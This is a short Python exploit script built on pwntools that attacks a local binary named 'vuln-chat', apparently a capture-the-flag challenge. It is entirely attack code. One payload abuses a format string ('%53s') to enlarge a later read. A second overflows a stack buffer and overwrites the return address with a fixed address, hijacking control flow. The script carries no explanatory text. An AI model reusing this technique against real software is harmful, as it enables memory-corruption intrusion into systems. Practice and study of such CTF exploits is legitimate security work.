#!/usr/bin/python3

from pwn import *

payload_a = b'A' * 0x14
payload_a += b'%53s\x00'

payload_b = b'A' * 0x31
payload_b += p32(0x804856b)

#target = gdb.debug('./vuln-chat','''
#b *0x804865c
#c
#''')
#b *0x8048613
target = process('./vuln-chat')

print(target.recvuntil(b'username:'))
target.sendline(payload_a)

print(target.recvuntil(b'trust you?'))
target.sendline(payload_b)
print(target.recvline())
print(target.recvline())
print(target.recvline())
print(target.recvline())
